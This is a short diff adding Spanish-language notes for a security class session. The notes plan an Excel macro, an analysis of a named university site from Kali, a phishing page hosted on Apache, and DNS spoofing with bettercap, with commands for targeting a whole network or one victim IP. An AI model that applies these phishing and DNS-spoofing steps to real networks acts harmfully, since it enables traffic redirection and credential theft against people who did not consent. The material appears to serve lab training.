@@ -1,0 +1,34 @@
+Sesion 5:
+- Terminar macro excel
+- Analisis pagina eia Kali
+- Crear pagina pishing
+- Comando para spoofear dns
+
+1) Ver sesion 4
+
+2) Analisis pagina:
+    - Ingresar desde Kali eiadigital.eia.com y loguearse
+    - Analisis
+
+3) -Crear pagina pishing o buscar una plantilla en internet
+   - Instalar apache sudo apt-get install apache2
+   - Ir a la carpeta /var/www/html y pegar ahi la pagina 
+
+
+
+4) Spoofing:
+    - instalar bettercap en kali: sudo apt-get install bettercap
+
+    - Configurar host.conf
+        + Crear archivo host.cont
+        + Poner <ip donde redireccionar>            <direccion que quiero redireccionar>
+        + Guardar
+
+
+    -Spoofing: Toda la red
+        + Mirar la direccion del gateway con route -n
+        + sudo bettercap -G <direccion gateway>  --dns host.conf
+
+    -Spoofing: Con objetivo
+        + Mirar la direccion del gateway con route -n
+        + sudo bettercap -G <direccion gateway> -T <ipObjetivo> --dns host.conf
